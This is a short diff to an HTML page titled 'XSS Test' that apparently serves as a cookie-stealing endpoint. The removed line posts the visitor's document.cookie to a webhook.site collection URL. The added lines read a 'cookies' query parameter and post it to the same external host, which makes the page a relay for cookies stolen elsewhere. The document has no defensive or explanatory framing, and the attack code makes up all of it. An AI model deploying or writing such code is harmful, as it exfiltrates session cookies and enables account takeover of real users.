@@ -4,6 +4,9 @@
     <title>XSS Test</title>
 </head>
 <body>
-    <script>fetch('https://webhook.site/0973988c-7f2d-4cc9-8888-bc95f808f585', {method: 'POST', body: document.cookie})</script>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const cookies = params.get('cookies');
+        fetch('https://webhook.site/0973988c-7f2d-4cc9-8888-bc95f808f585', {method: 'POST', body: cookies, headers: { 'Content-Type': 'application/x-www-form-urlencoded'})</script>
 </body>
 </html>
